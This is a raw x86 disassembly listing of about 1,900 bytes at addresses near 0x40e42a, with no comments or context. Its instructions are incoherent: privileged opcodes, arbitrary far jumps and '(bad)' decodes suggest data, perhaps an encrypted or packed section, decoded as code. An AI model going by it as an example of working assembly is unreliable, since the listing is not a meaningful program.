  40e42a:	mov    ecx,0x2b46af73
  40e42f:	mov    eax,ds:0x48e1fca5
  40e434:	iret   
  40e435:	and    dl,BYTE PTR [edi+0x66]
  40e438:	shl    BYTE PTR [edi+0x5ab6063e],1
  40e43e:	lahf   
  40e43f:	mov    es,WORD PTR [edi+0x22]
  40e442:	cwde   
  40e443:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e444:	std    
  40e445:	mov    edi,0xa1ed89ef
  40e44a:	adc    cl,BYTE PTR [ebx+0x3]
  40e44d:	leave  
  40e44e:	sbb    bh,BYTE PTR [esi+ebp*4]
  40e451:	aam    0x92
  40e453:	xor    DWORD PTR [esi-0x20],esp
  40e456:	pop    es
  40e457:	je     0x40e484
  40e459:	out    dx,al
  40e45a:	pop    ebp
  40e45b:	inc    esp
  40e45c:	not    BYTE PTR [eax+0x6e]
  40e45f:	retf   
  40e460:	mov    WORD PTR [eax-0x3b596474],ds
  40e466:	sub    DWORD PTR [ebx],ebp
  40e468:	xchg   edx,eax
  40e469:	jp     0x40e495
  40e46b:	hlt    
  40e46c:	je     0x40e429
  40e46e:	outs   dx,DWORD PTR ds:[esi]
  40e46f:	xor    edi,DWORD PTR [ecx-0x52]
  40e472:	in     eax,0x95
  40e474:	push   0x30db6867
  40e479:	jecxz  0x40e429
  40e47b:	ret    
  40e47c:	jl     0x40e4c5
  40e47e:	adc    al,0x81
  40e480:	shr    BYTE PTR ds:0xe3338dea,1
  40e486:	clc    
  40e487:	and    bl,BYTE PTR [edx-0x4e66969f]
  40e48d:	sbb    dl,bl
  40e48f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e490:	mov    ebx,0xb478b91a
  40e495:	sbb    eax,0x6922a5c3
  40e49a:	sub    edi,esi
  40e49c:	mov    cl,0xcf
  40e49e:	inc    edx
  40e49f:	mov    dl,BYTE PTR [eax-0x2]
  40e4a2:	adc    BYTE PTR [edi-0x3511586f],0x54
  40e4a9:	aad    0x64
  40e4ab:	mov    ebp,0x2a68fb41
  40e4b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4b1:	push   esi
  40e4b2:	bound  ebx,QWORD PTR [ebx-0x2f1500b5]
  40e4b8:	bound  ebp,QWORD PTR [edx]
  40e4ba:	repnz push cs
  40e4bc:	out    0x6a,eax
  40e4be:	cmp    esp,edi
  40e4c0:	adc    eax,0xd53efd03
  40e4c5:	loop   0x40e4f4
  40e4c7:	pop    eax
  40e4c8:	or     al,0xb3
  40e4ca:	push   ecx
  40e4cb:	xor    dl,BYTE PTR [ebp+0x76]
  40e4ce:	mov    ebp,0x799523da
  40e4d3:	icebp  
  40e4d4:	push   es
  40e4d5:	cmp    eax,esi
  40e4d7:	repz jmp edx
  40e4da:	push   0x9
  40e4dc:	mov    ebx,0x7dfc582f
  40e4e1:	xlat   BYTE PTR ds:[ebx]
  40e4e2:	xlat   BYTE PTR ds:[ebx]
  40e4e3:	push   esi
  40e4e4:	or     dl,BYTE PTR [ecx+0x108802f3]
  40e4ea:	inc    edi
  40e4eb:	pop    es
  40e4ec:	or     al,0x3d
  40e4ee:	(bad)
  40e4f1:	push   esp
  40e4f2:	ret    
  40e4f3:	scas   al,BYTE PTR es:[edi]
  40e4f4:	adc    eax,0xd4f0186d
  40e4f9:	jl     0x40e54f
  40e4fb:	xlat   BYTE PTR ds:[ebx]
  40e4fc:	mov    esp,0xe0bf5f7c
  40e501:	in     eax,0xcc
  40e503:	xchg   esi,eax
  40e504:	fisubr WORD PTR [edi+0x24ad7c57]
  40e50a:	sub    eax,0x423a243c
  40e50f:	and    dl,dl
  40e511:	in     al,0xa9
  40e513:	push   ss
  40e514:	mov    eax,ds:0xada5e487
  40e519:	pop    ebp
  40e51a:	pop    edx
  40e51b:	jnp    0x40e4db
  40e51d:	and    eax,0xa318d81c
  40e522:	jl     0x40e530
  40e524:	jno    0x40e4f0
  40e526:	jge    0x40e4d1
  40e528:	div    BYTE PTR [eax-0x1f]
  40e52b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e52c:	sub    BYTE PTR [esi],0xaf
  40e52f:	jmp    0x5804:0x1083f128
  40e536:	ja     0x40e4bf
  40e538:	xor    dl,al
  40e53a:	sti    
  40e53b:	push   eax
  40e53c:	push   ds
  40e53d:	rol    BYTE PTR [edx+0x28],cl
  40e540:	cwde   
  40e541:	sub    al,0x44
  40e543:	and    DWORD PTR [ecx-0x31],esp
  40e546:	sbb    ah,BYTE PTR [ecx+0x1f114cae]
  40e54c:	call   0x26b9:0x3380c6fd
  40e553:	pop    eax
  40e554:	push   esp
  40e555:	xchg   esi,eax
  40e556:	in     al,0xac
  40e558:	dec    ecx
  40e559:	mov    ds,WORD PTR [eax]
  40e55b:	mov    ebp,0x275e224c
  40e560:	pop    ds
  40e561:	jae    0x40e587
  40e563:	fild   DWORD PTR cs:[ebp-0x44b25ba7]
  40e56a:	add    edi,DWORD PTR ds:[eax+0x66]
  40e56e:	xchg   edi,eax
  40e56f:	mov    DWORD PTR [esi-0x42],ecx
  40e572:	lahf   
  40e573:	nop
  40e574:	xor    DWORD PTR [eax+eiz*2],ebx
  40e577:	mov    ebx,0x69ae18ff
  40e57c:	ds sbb eax,0xfec6f2ba
  40e582:	jne    0x40e581
  40e584:	cmp    al,0xbf
  40e586:	jle    0x40e601
  40e588:	dec    ebx
  40e589:	rcl    BYTE PTR [edi+0x69],0xe4
  40e58d:	test   al,0x31
  40e58f:	push   edx
  40e590:	aad    0x6d
  40e592:	and    DWORD PTR [esi],esp
  40e594:	sbb    al,0x13
  40e596:	retf   
  40e597:	in     eax,0x15
  40e599:	mov    eax,0x2b2d4c00
  40e59e:	std    
  40e59f:	mov    eax,ds:0x6d1282dc
  40e5a4:	and    dh,BYTE PTR [ebp+0x67]
  40e5a7:	stos   DWORD PTR es:[edi],eax
  40e5a8:	sbb    ah,BYTE PTR [esi]
  40e5aa:	sbb    DWORD PTR fs:[ecx+0xdd0e214],edx
  40e5b1:	cwde   
  40e5b2:	jmp    FWORD PTR [edx+0x4d5b35d3]
  40e5b8:	push   cs
  40e5b9:	in     al,0xf1
  40e5bb:	(bad)  
  40e5bd:	inc    ebx
  40e5be:	shl    BYTE PTR [esi],1
  40e5c0:	outs   dx,BYTE PTR ds:[esi]
  40e5c1:	mov    dh,BYTE PTR [edx+0x79064781]
  40e5c7:	repz (bad) 
  40e5c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5ca:	ds push edx
  40e5cc:	(bad)  
  40e5cd:	xchg   ecx,eax
  40e5ce:	add    al,0x9a
  40e5d0:	pop    esi
  40e5d1:	sbb    ah,BYTE PTR [edi-0x28]
  40e5d4:	aas    
  40e5d5:	mov    ebp,0x6fc614c3
  40e5da:	mov    esp,0xfbe7cf4
  40e5df:	jle    0x40e5b0
  40e5e1:	(bad)
  40e5e4:	ret    0x21d0
  40e5e7:	and    al,0x40
  40e5e9:	fld    TBYTE PTR [esi-0x10]
  40e5ec:	out    0xe7,al
  40e5ee:	push   esi
  40e5ef:	sub    ah,BYTE PTR [eax+0x3e55d6c7]
  40e5f5:	inc    esp
  40e5f6:	fwait
  40e5f7:	inc    esi
  40e5f8:	mov    eax,ds:0x1844f68c
  40e5fd:	pop    ds
  40e5fe:	inc    edi
  40e5ff:	or     BYTE PTR [edx-0x13],0x2b
  40e603:	push   ss
  40e604:	ss mov esi,0xa748a6f6
  40e60a:	fucomp st(6)
  40e60c:	and    al,0x6f
  40e60e:	je     0x40e5ab
  40e610:	cmp    al,0x4c
  40e612:	mov    eax,0x4a3319b9
  40e617:	in     eax,dx
  40e618:	rol    BYTE PTR [esi-0x29],1
  40e61b:	mov    dh,0xdc
  40e61d:	in     al,0xc3
  40e61f:	cli    
  40e620:	cmp    ah,dl
  40e622:	sti    
  40e623:	pop    ebp
  40e624:	aam    0x78
  40e626:	jp     0x40e675
  40e628:	imul   esp,esi,0x0
  40e62b:	push   ss
  40e62c:	mov    ds:0x4d6b7e49,al
  40e631:	stos   BYTE PTR es:[edi],al
  40e632:	ret    0xed29
  40e635:	jne    0x40e636
  40e637:	xchg   DWORD PTR ds:0x11ea4e93,edx
  40e63d:	pop    es
  40e63e:	ja     0x40e65b
  40e640:	js     0x40e61b
  40e642:	aaa    
  40e643:	sub    eax,0x28f9f7b
  40e648:	sub    DWORD PTR [ecx],ecx
  40e64a:	or     dh,BYTE PTR [esp+eax*8]
  40e64d:	pop    edx
  40e64e:	aam    0x4
  40e650:	inc    ebp
  40e651:	scas   eax,DWORD PTR es:[edi]
  40e652:	add    edx,edx
  40e654:	imul   eax
  40e656:	sahf   
  40e657:	dec    esi
  40e658:	aad    0xa
  40e65a:	cmp    eax,0xe01d1b6
  40e65f:	(bad)  
  40e660:	fistp  WORD PTR [eax-0x652aa1bd]
  40e666:	jns    0x40e63a
  40e668:	mov    ds:0xdc8207f0,eax
  40e66d:	mov    edi,0xa9dacd35
  40e672:	loopne 0x40e682
  40e674:	sub    esi,edx
  40e676:	loop   0x40e603
  40e678:	mov    ?,WORD PTR [ecx]
  40e67a:	xor    DWORD PTR [eax+0x27],edi
  40e67d:	pop    ds
  40e67e:	or     ebx,ecx
  40e680:	int    0x43
  40e682:	push   ss
  40e683:	mov    dh,0xe7
  40e685:	inc    ebx
  40e686:	sub    ah,BYTE PTR [eax-0x144128ad]
  40e68c:	cdq    
  40e68d:	ds jg  0x40e642
  40e690:	icebp  
  40e691:	mov    al,0x77
  40e693:	xor    dh,al
  40e695:	xor    bl,0x6f
  40e698:	mov    dl,0x33
  40e69a:	push   edx
  40e69b:	or     DWORD PTR [ebx-0x60],eax
  40e69e:	and    eax,0x9ca32890
  40e6a3:	sub    ebx,DWORD PTR [edi-0x29]
  40e6a6:	test   eax,0x411a77ab
  40e6ab:	sbb    eax,0x2534a0f1
  40e6b0:	jnp    0x40e67d
  40e6b2:	sbb    eax,0xd9571875
  40e6b7:	adc    BYTE PTR [edx+0x51551a79],0x3d
  40e6be:	push   cs
  40e6bf:	aad    0xb
  40e6c1:	push   eax
  40e6c2:	imul   ebp,edi,0xffffffc0
  40e6c5:	mov    eax,ds:0x7859205a
  40e6ca:	or     dh,ch
  40e6cc:	push   ss
  40e6cd:	add    DWORD PTR ds:0x3e664d23,ebp
  40e6d3:	xor    ebx,DWORD PTR [ecx-0x56]
  40e6d6:	or     esp,edi
  40e6d8:	les    edx,FWORD PTR [edx+0x14]
  40e6db:	mov    dh,al
  40e6dd:	mov    ecx,0xf8731929
  40e6e2:	in     al,0xca
  40e6e4:	das    
  40e6e5:	xor    esp,eax
  40e6e7:	push   edx
  40e6e8:	xor    dl,cl
  40e6ea:	push   esi
  40e6eb:	rcr    al,1
  40e6ed:	mov    eax,ds:0x2b9c9bbf
  40e6f2:	push   edx
  40e6f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6f4:	cmp    esi,DWORD PTR [edx]
  40e6f6:	xor    cl,ah
  40e6f8:	adc    esp,DWORD PTR [edx-0xdaba6d9]
  40e6fe:	xor    al,0xde
  40e700:	push   esp
  40e701:	fist   WORD PTR [eax+eiz*1]
  40e704:	inc    eax
  40e705:	repz lds bp,DWORD PTR [edx]
  40e709:	mov    WORD PTR [eax],ss
  40e70b:	mov    eax,ds:0x27c14799
  40e710:	pop    ss
  40e711:	inc    edi
  40e712:	mov    ecx,0x60f145e2
  40e717:	xchg   ebp,eax
  40e718:	inc    esi
  40e719:	lahf   
  40e71a:	mov    cl,0xa6
  40e71c:	add    ch,dl
  40e71e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e71f:	pusha  
  40e720:	cwde   
  40e721:	cmp    BYTE PTR [edx],dl
  40e723:	inc    ecx
  40e724:	xor    esp,DWORD PTR [edx-0x1772024b]
  40e72a:	xor    DWORD PTR ds:0x9c7029a,esp
  40e730:	fwait
  40e731:	push   ebx
  40e732:	retf   0xa8c7
  40e735:	arpl   WORD PTR [ebp-0x7bd77273],si
  40e73b:	addr16 mov eax,ds:0x26b4
  40e73f:	ffreep st(0)
  40e741:	pusha  
  40e742:	push   esp
  40e743:	pop    ecx
  40e744:	or     dh,ah
  40e746:	mov    edi,DWORD PTR [esi+0x6de8de8e]
  40e74c:	mov    ebx,0x94d5c39b
  40e751:	loopne 0x40e78c
  40e753:	pop    esi
  40e754:	out    dx,al
  40e755:	xor    ch,BYTE PTR [edx]
  40e757:	ret    0xa750
  40e75a:	cmp    ecx,edi
  40e75c:	repnz add BYTE PTR [ebp-0x75],0xf1
  40e761:	dec    eax
  40e762:	int    0xe
  40e764:	fld    QWORD PTR [ebp-0x4d]
  40e767:	dec    eax
  40e768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e769:	loope  0x40e79c
  40e76b:	(bad)  
  40e76c:	int3   
  40e76d:	sub    al,0x47
  40e76f:	pop    ecx
  40e770:	dec    ebp
  40e771:	xchg   ebp,eax
  40e772:	pop    ds
  40e773:	imul   edx,DWORD PTR [edi],0xffffffb2
  40e776:	cmp    ecx,DWORD PTR [esp+ecx*8]
  40e779:	xor    edx,edi
  40e77b:	inc    esp
  40e77c:	xor    DWORD PTR [ebx],ebx
  40e77e:	sub    DWORD PTR [ebp+0x7b5bf3da],ecx
  40e784:	ins    BYTE PTR es:[edi],dx
  40e785:	jecxz  0x40e772
  40e787:	push   ss
  40e788:	in     eax,dx
  40e789:	scas   al,BYTE PTR es:[edi]
  40e78a:	inc    esi
  40e78b:	pop    esi
  40e78c:	push   esi
  40e78d:	mov    ds,WORD PTR [ecx-0x14ec5ff0]
  40e793:	or     BYTE PTR [esi-0x7e],ch
  40e796:	push   0x42215d26
  40e79b:	xor    edx,DWORD PTR [edx+0x30cd837f]
  40e7a1:	pop    ds
  40e7a2:	test   eax,0x500b2b82
  40e7a7:	popf   
  40e7a8:	aad    0x5c
  40e7aa:	sub    al,0x2a
  40e7ad:	fiadd  DWORD PTR [ecx]
  40e7af:	call   ecx
  40e7b1:	and    BYTE PTR [edi+0xb],ch
  40e7b4:	aaa    
  40e7b5:	inc    ecx
  40e7b6:	sub    ch,BYTE PTR [ecx]
  40e7b8:	jne    0x40e7ef
  40e7ba:	shr    BYTE PTR ds:0xcb023849,1
  40e7c0:	push   ecx
  40e7c1:	xchg   ebp,eax
  40e7c2:	call   0xaad7988
  40e7c7:	aas    
  40e7c8:	(bad)  
  40e7c9:	mov    ds:0x19414af2,eax
  40e7ce:	mov    ebx,0xf409c1eb
  40e7d3:	adc    eax,0x2413f3db
  40e7d8:	or     BYTE PTR [edx+ebx*2],ah
  40e7db:	les    edi,FWORD PTR [ecx+0x44]
  40e7de:	(bad)  
  40e7df:	xor    DWORD PTR [edx-0x1dddec02],esi
  40e7e5:	frstor [edi+edi*8]
  40e7e8:	mov    WORD PTR [ecx+0x15ed41c1],ss
  40e7ee:	inc    edi
  40e7ef:	aam    0x25
  40e7f1:	jbe    0x40e822
  40e7f3:	test   DWORD PTR [ecx],esi
  40e7f5:	and    ebx,DWORD PTR [edi-0x1fdfc259]
  40e7fb:	fist   WORD PTR [edi-0x7b]
  40e7fe:	and    BYTE PTR [eax+0x0],cl
  40e801:	sbb    DWORD PTR [ebx+edx*8-0x13f7b08e],0x13382e32
  40e80c:	and    eax,0x3e943cbb
  40e811:	inc    eax
  40e812:	call   0x5b90:0x2d903e28
  40e819:	or     al,BYTE PTR [esi]
  40e81b:	ficomp DWORD PTR [edi+0x52]
  40e81e:	add    esi,ebx
  40e820:	sbb    edx,ebp
  40e822:	jmp    0xd6390148
  40e827:	cmova  ebp,DWORD PTR [eax]
  40e82a:	push   ds
  40e82b:	add    al,0xdd
  40e82d:	or     eax,0x8193f3c3
  40e832:	inc    esp
  40e833:	xchg   esp,eax
  40e834:	sub    bh,BYTE PTR [ecx+0x79]
  40e837:	stos   DWORD PTR es:[edi],eax
  40e838:	(bad)
  40e83b:	test   eax,0x6a894488
  40e840:	push   ds
  40e841:	xchg   ebx,eax
  40e842:	es out dx,al
  40e844:	pop    ds
  40e845:	arpl   WORD PTR [eax+0x5e],cx
  40e848:	and    eax,0x63668ec2
  40e84d:	in     eax,dx
  40e84e:	jb     0x40e7fb
  40e850:	jmp    0x806b2f1b
  40e855:	test   DWORD PTR [edx],edx
  40e857:	repz jns 0x40e89d
  40e85a:	sbb    DWORD PTR [esi],0xffffff86
  40e85d:	sub    DWORD PTR [esi+0x7c],0xcb211a
  40e864:	in     al,dx
  40e865:	nop
  40e866:	inc    ebx
  40e867:	add    BYTE PTR [edx-0x61674a36],bl
  40e86d:	cwde   
  40e86e:	sub    BYTE PTR [esi],al
  40e870:	clc    
  40e871:	jmp    0x80a0:0xddd705cd
  40e878:	int3   
  40e879:	add    ebx,DWORD PTR ds:0x345b3c38
  40e87f:	fcomi  st,st(7)
  40e881:	repz push es
  40e883:	ja     0x40e8f4
  40e885:	inc    ecx
  40e886:	test   BYTE PTR [eax],dh
  40e888:	or     ebp,eax
  40e88a:	sti    
  40e88b:	pop    edx
  40e88c:	cmc    
  40e88d:	dec    esp
  40e88e:	push   edx
  40e88f:	or     bh,ah
  40e891:	add    DWORD PTR [edx+0xf6ad8e5],0xffffffb2
  40e898:	add    al,0x9c
  40e89a:	repz inc ebx
  40e89c:	fild   QWORD PTR ds:0x69721bed
  40e8a2:	pop    esi
  40e8a3:	out    dx,eax
  40e8a4:	adc    BYTE PTR [edx+ebx*2-0xb],bl
  40e8a8:	mov    ds:0x46735f1f,al
  40e8ad:	xchg   ebx,eax
  40e8ae:	xchg   ebp,eax
  40e8af:	cld    
  40e8b0:	push   ebp
  40e8b1:	xor    edx,DWORD PTR [esi+edi*4]
  40e8b4:	call   0x166f:0x97352f0e
  40e8bb:	and    BYTE PTR [ecx],ah
  40e8bd:	cld    
  40e8be:	outs   dx,DWORD PTR ds:[esi]
  40e8bf:	cdq    
  40e8c0:	push   edx
  40e8c1:	inc    ebp
  40e8c2:	dec    ecx
  40e8c3:	mov    ecx,0x92fc163c
  40e8c8:	pop    edi
  40e8c9:	loop   0x40e90b
  40e8cb:	nop
  40e8cc:	aad    0x34
  40e8ce:	sub    esp,DWORD PTR [esi+edx*8]
  40e8d1:	shr    DWORD PTR [esi-0x4a],1
  40e8d4:	ret    
  40e8d5:	jne    0x40e94e
  40e8d7:	dec    eax
  40e8d8:	popa   
  40e8d9:	pop    ds
  40e8da:	pop    sp
  40e8dc:	adc    eax,0x9933794
  40e8e1:	add    BYTE PTR [ebp+edi*8+0x4cf98885],ch
  40e8e8:	cmc    
  40e8e9:	xchg   ebp,eax
  40e8ea:	add    DWORD PTR [edi+0x45],esp
  40e8ed:	fsub   QWORD PTR [ebp+0x58c885b6]
  40e8f3:	dec    esp
  40e8f4:	(bad)  
  40e8f6:	aaa    
  40e8f7:	mov    ebx,0xb4e0f418
  40e8fc:	pop    eax
  40e8fd:	clc    
  40e8fe:	sbb    BYTE PTR [eax-0x1d17555c],bh
  40e904:	and    al,BYTE PTR [edi+0x15]
  40e907:	aaa    
  40e908:	sub    eax,0x3d721db9
  40e90d:	jns    0x40e97b
  40e90f:	push   ss
  40e910:	cwde   
  40e911:	push   eax
  40e912:	sbb    eax,0x54811e11
  40e917:	or     al,0xc5
  40e919:	popa   
  40e91a:	xor    eax,0xfc0b9d44
  40e91f:	icebp  
  40e920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e921:	cmp    edi,DWORD PTR [ecx]
  40e923:	dec    edi
  40e924:	add    DWORD PTR [ebx+0x222ea87b],esp
  40e92a:	icebp  
  40e92b:	adc    BYTE PTR [ebp+edx*2-0x4b5b2fba],dl
  40e932:	xchg   esp,eax
  40e933:	call   0xc93b:0x1b0ef873
  40e93a:	dec    ebp
  40e93b:	push   ds
  40e93c:	dec    esp
  40e93d:	push   ebp
  40e93e:	test   eax,0x68340256
  40e943:	fmul   DWORD PTR [ecx-0x6dd28e20]
  40e949:	fsub   QWORD PTR [eax]
  40e94b:	dec    ebp
  40e94c:	cmp    al,0xed
  40e94e:	xchg   DWORD PTR [edi],ecx
  40e950:	addr16 int 0xbf
  40e953:	cmp    BYTE PTR [esi+0xe],0x76
  40e957:	sahf   
  40e958:	add    ah,BYTE PTR [edx+0x16]
  40e95b:	ds out 0x30,eax
  40e95e:	cwde   
  40e95f:	push   esp
  40e960:	mov    ds:0xae394aa4,al
  40e965:	inc    edx
  40e966:	dec    edi
  40e967:	clc    
  40e968:	sub    dh,BYTE PTR [edi-0x70]
  40e96b:	push   0x7085c57
  40e970:	jle    0x40e9c0
  40e972:	and    BYTE PTR ds:0x17f6d048,0xa9
  40e979:	xor    BYTE PTR [eax+ecx*2-0x2f],cl
  40e97d:	mov    ds:0xce4cbbf3,al
  40e982:	das    
  40e983:	int3   
  40e984:	retf   0x4944
  40e987:	icebp  
  40e988:	cmc    
  40e989:	ja     0x40e928
  40e98b:	scas   al,BYTE PTR es:[edi]
  40e98c:	in     al,dx
  40e98d:	std    
  40e98e:	lds    ebp,FWORD PTR [esi+0x6de312f2]
  40e994:	xchg   ecx,eax
  40e995:	push   esi
  40e996:	mov    edx,0x2c266209
  40e99b:	xchg   DWORD PTR [edx+ecx*4],eax
  40e99e:	or     bh,BYTE PTR [esi]
  40e9a0:	fist   DWORD PTR [eax+eiz*4-0x47]
  40e9a4:	inc    esp
  40e9a5:	gs in  eax,0x38
  40e9a8:	adc    DWORD PTR [edi],eax
  40e9aa:	div    DWORD PTR [edx+0x48]
  40e9ad:	pop    edi
  40e9ae:	pop    ecx
  40e9af:	xor    cl,BYTE PTR es:[ebx]
  40e9b2:	jmp    0xba1e:0xea84de30
  40e9b9:	sub    DWORD PTR ds:0xe3bf6caa,eax
  40e9bf:	cli    
  40e9c0:	push   esi
  40e9c1:	xor    edi,ebx
  40e9c3:	mov    ch,bh
  40e9c5:	xchg   ebx,eax
  40e9c6:	fstp   TBYTE PTR [eax+0x6c]
  40e9c9:	test   al,0x3b
  40e9cb:	adc    ebp,DWORD PTR [ecx]
  40e9cd:	xchg   BYTE PTR [ebx+0x59d0d1a0],ch
  40e9d3:	mov    DWORD PTR [ecx],ecx
  40e9d5:	cdq    
  40e9d6:	xor    BYTE PTR [eax+0x3e],cl
  40e9d9:	call   0xa2831027
  40e9de:	les    edi,FWORD PTR [ebx*4+0x3319c1f2]
  40e9e5:	xchg   DWORD PTR [edx-0x2],esi
  40e9e8:	or     eax,0x2cdd7f41
  40e9ed:	cmp    esp,edi
  40e9ef:	jecxz  0x40e9b0
  40e9f1:	adc    al,0xf5
  40e9f3:	scas   al,BYTE PTR es:[edi]
  40e9f4:	fild   DWORD PTR [edi+0x79398519]
  40e9fa:	cs (bad) 
  40e9fc:	inc    eax
  40e9fd:	test   eax,0xd9046319
  40ea02:	arpl   WORD PTR [edi-0x4c],si
  40ea05:	scas   al,BYTE PTR es:[edi]
  40ea06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea07:	enter  0x2d20,0xa9
  40ea0b:	or     eax,0x121393ba
  40ea10:	push   ebx
  40ea11:	imul   ebp,DWORD PTR [edx+0xbefdf70],0x7d3044ba
  40ea1b:	pop    ebx
  40ea1c:	mov    ebx,eax
  40ea1e:	pop    ebx
  40ea1f:	jmp    0x40ea82
  40ea21:	cdq    
  40ea22:	xchg   ebp,eax
  40ea23:	mov    eax,es
  40ea25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea26:	scas   al,BYTE PTR es:[edi]
  40ea27:	push   0x2e63ea39
  40ea2c:	clc    
  40ea2d:	mov    ah,0x5d
  40ea2f:	cmp    DWORD PTR [eax-0x79],esp
  40ea32:	inc    ebx
  40ea33:	mov    ecx,0x2e8c121f
  40ea38:	and    al,0xc1
  40ea3a:	dec    esi
  40ea3b:	and    BYTE PTR [eax-0x40],dh
  40ea3e:	dec    esp
  40ea3f:	hlt    
  40ea40:	sbb    cl,BYTE PTR [eax+0x5d]
  40ea43:	mov    bl,0xf7
  40ea45:	adc    dl,BYTE PTR [eax+0x61]
  40ea48:	aam    0x7c
  40ea4a:	fs mov bl,0x4
  40ea4d:	mov    dl,BYTE PTR [ebx]
  40ea4f:	or     DWORD PTR [ebx+0x56],esp
  40ea52:	mov    ch,0x59
  40ea54:	cmc    
  40ea55:	ss mov bl,0x4e
  40ea58:	mov    dl,BYTE PTR [ecx+0x74]
  40ea5b:	stos   DWORD PTR es:[edi],eax
  40ea5c:	movaps XMMWORD PTR [edi],xmm4
  40ea5f:	and    esi,0x1d9e374
  40ea65:	pushf  
  40ea66:	mov    dl,0x6
  40ea68:	jmp    FWORD PTR [edx+0x47]
  40ea6b:	add    bh,BYTE PTR [edx+ecx*1+0x3350d1eb]
  40ea72:	pop    edx
  40ea73:	repnz pushw ss
  40ea76:	xor    eax,0x31553000
  40ea7b:	in     eax,dx
  40ea7c:	push   cs
  40ea7d:	outs   dx,DWORD PTR ds:[esi]
  40ea7e:	jno    0x40eadb
  40ea80:	jecxz  0x40ea8c
  40ea82:	inc    ebp
  40ea83:	sub    al,0xcd
  40ea85:	push   eax
  40ea86:	test   eax,0xd5cf7c1
  40ea8b:	sbb    al,0x9a
  40ea8d:	sub    DWORD PTR [eax-0x57],ebp
  40ea90:	in     eax,dx
  40ea91:	mov    al,0x6d
  40ea93:	mov    BYTE PTR [ecx+ebp*2+0x1ec4aa87],bh
  40ea9a:	loope  0x40ea7f
  40ea9c:	mov    al,BYTE PTR [esi+0x290edc0f]
  40eaa2:	dec    esi
  40eaa3:	mov    esi,0xb270eee7
  40eaa8:	jge    0x40ea63
  40eaaa:	jmp    0x3fa2:0x542bfc74
  40eab1:	jge    0x40eb0f
  40eab3:	sbb    BYTE PTR [esi],cl
  40eab5:	in     eax,0x95
  40eab7:	repnz jecxz 0x40eb24
  40eaba:	dec    eax
  40eabb:	sahf   
  40eabc:	or     al,0xd3
  40eabe:	pop    es
  40eabf:	push   ecx
  40eac0:	pop    ebx
  40eac1:	ss sbb eax,0xa1271c50
  40eac7:	jp     0x40ea70
  40eac9:	dec    esi
  40eaca:	sub    BYTE PTR [ebx+0x44f7ac6f],al
  40ead0:	jmp    0x91077d69
  40ead5:	bound  edx,QWORD PTR [edi-0x1a958dd5]
  40eadb:	sub    DWORD PTR [esp+edx*1],eax
  40eade:	loope  0x40eb18
  40eae0:	out    0xa,eax
  40eae2:	rcl    BYTE PTR [edi+0x63],1
  40eae5:	(bad)  
  40eae6:	ds lock push 0xffffffc8
  40eaea:	pop    ecx
  40eaeb:	jno    0x40eaa4
  40eaed:	shl    BYTE PTR ds:[ebx+ecx*2],0xe0
  40eaf2:	xchg   esp,eax
  40eaf3:	lds    ebp,FWORD PTR [ebx]
  40eaf5:	ficom  WORD PTR [edx+0x51]
  40eaf8:	clc    
  40eaf9:	js     0x40eb50
  40eafb:	push   ebp
  40eafc:	test   al,0x51
  40eafe:	xor    al,dh
  40eb00:	jmp    0x40eaff
  40eb02:	dec    ecx
  40eb03:	jmp    0x16b8d78e
  40eb08:	mov    edi,0x446109d8
  40eb0d:	add    ecx,0xffffffca
  40eb10:	in     eax,dx
  40eb11:	aam    0x35
  40eb13:	in     eax,0xbf
  40eb15:	sub    al,0x29
  40eb17:	test   DWORD PTR [esi+0x77],eax
  40eb1a:	xchg   edx,eax
  40eb1b:	and    edx,ebp
  40eb1d:	out    dx,al
  40eb1e:	mov    es,WORD PTR [ecx]
  40eb20:	fwait
  40eb21:	and    BYTE PTR [edi+edi*2+0x71],0xfb
  40eb26:	or     BYTE PTR [eax-0xc8050df],bh
  40eb2c:	mov    esi,0x826a9676
  40eb31:	adc    bh,dl
  40eb33:	sub    al,0xf3
  40eb35:	sub    ecx,DWORD PTR [ebx-0x3a411151]
  40eb3b:	pop    es
  40eb3c:	mov    edx,0xe2b6b351
  40eb41:	lods   eax,DWORD PTR ds:[esi]
  40eb42:	aaa    
  40eb43:	lahf   
  40eb44:	outs   dx,DWORD PTR ds:[esi]
  40eb45:	xchg   esi,eax
  40eb46:	icebp  
  40eb47:	pop    ss
  40eb48:	mov    edi,0xf737732b
  40eb4d:	shl    BYTE PTR [esi-0x55],cl
  40eb50:	in     al,0xa2
  40eb52:	push   es
  40eb53:	shl    BYTE PTR [eax],1
  40eb55:	arpl   WORD PTR [esi-0x57],cx
  40eb58:	mov    bl,0x3a
  40eb5a:	dec    esi
  40eb5b:	push   cs
  40eb5c:	mov    edx,0x29146154
  40eb61:	inc    ecx
  40eb62:	ror    al,cl
  40eb64:	aam    0xe6
  40eb66:	aad    0x5f
  40eb68:	inc    ecx
  40eb69:	jae    0x40eafe
  40eb6b:	addr16 mov dl,0xfa
  40eb6e:	xchg   ebx,eax
  40eb6f:	and    esp,ebp
  40eb71:	jg     0x40eb33
  40eb73:	fisttp WORD PTR [esi]
  40eb75:	fist   WORD PTR [ecx-0x5c1924fb]
  40eb7b:	enter  0xc690,0x40
  40eb7f:	scas   eax,DWORD PTR es:[edi]
  40eb80:	mov    dl,0xa0
  40eb82:	adc    ebp,edx
  40eb84:	test   DWORD PTR [ebp+0x20729760],ebx
  40eb8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb8b:	dec    ebp
  40eb8c:	fs hlt 
  40eb8e:	jnp    0x40eb2d
  40eb90:	mov    ebx,0x63cc949a
  40eb95:	and    dl,dl
  40eb97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb98:	adc    ah,BYTE PTR [ecx-0x52b427b3]
  40eb9e:	pop    edi
  40eb9f:	dec    eax
  40eba0:	cmp    bh,BYTE PTR [eax+0x5ab19c3d]
  40eba6:	adc    DWORD PTR [edi],edx
  40eba8:	(bad)  [edi+0x7c35009]
  40ebae:	std    
